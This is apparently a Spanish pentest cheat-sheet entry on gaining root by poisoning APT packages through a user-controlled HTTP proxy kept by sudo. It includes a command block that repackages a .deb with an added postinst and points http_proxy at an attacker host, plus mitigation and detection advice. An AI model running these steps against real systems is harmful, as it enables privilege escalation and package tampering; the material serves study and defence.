---
topic: APT — envenenamiento de paquetes mediante proxy
tags: [linux, apt, proxy, supply-chain, privesc]
---

# APT — envenenamiento de paquetes mediante proxy

[🌐 English](apt-proxy-package-poisoning.en.md) | **Español**

## Concepto

Si un usuario puede ejecutar `apt-get update` y `apt-get upgrade` con sudo y conservar un proxy HTTP propio, controla el canal por el que apt descarga metadatos y paquetes. Un repositorio falso puede anunciar una versión superior de un paquete instalado; su script `postinst` se ejecuta como root durante la actualización.

## Cuándo aplica

- `sudo -l` permite `apt-get update` o `upgrade` y `env_keep` conserva `http_proxy`.
- Hay un repositorio en `sources.list.d` que se puede suplantar.
- El usuario puede crear un paquete con la misma arquitectura y versión superior.

## Procedimiento

1. Revisar `sudo -l`, `sources.list` y `env_keep`.
2. Elegir un paquete instalado, descomprimirlo y añadir una acción en `postinst`.
3. Reempaquetar con una versión superior y construir `Packages`/`Release` coherentes.
4. Levantar el proxy, ejecutar `apt-get update` y `apt-get upgrade` como root.

## Comandos

```bash
sudo -l
cat /etc/apt/sources.list /etc/apt/sources.list.d/*.list
dpkg -l | grep <PACKAGE>
dpkg-deb -R paquete.deb build && dpkg-deb -b build paquete_1.0_all.deb
export http_proxy=http://<IP>:8888
sudo apt-get update && sudo apt-get upgrade
```

## Variantes

- Responder con un `Release` sin firmar si apt no exige firma.
- Usar un paquete que ya tenga un `postinst` y añadir una línea.
- Envenenar solo `Packages.gz` para que apt vea una versión nueva.

## Limitaciones

- Los repositorios firmados y las claves de confianza bloquean el paquete falso.
- `apt-get` puede requerir confirmación interactiva.
- La versión y la arquitectura deben coincidir con las del sistema.

## Mitigación

- No conservar `http_proxy` en reglas sudo y no permitir `apt` arbitrario.
- Exigir repositorios firmados y verificar huellas de claves.
- Aplicar egress allowlist y monitorizar cambios en `sources.list.d`.

## Detección

- Paquetes instalados desde un host que no es el repositorio oficial.
- Ejecuciones de `postinst` que lanzan shells o crean usuarios.
- Cambios en `Packages` con versiones superiores sin un despliegue.

## Referencias

- [0xdf — OneTwoSeven](https://0xdf.gitlab.io/2019/08/31/htb-onetwoseven.html)
- [Debian — apt.conf(5)](https://manpages.debian.org/bookworm/apt/apt.conf.5.en.html)
- [CWE-494 — Download of Code Without Integrity Check](https://cwe.mitre.org/data/definitions/494.html)
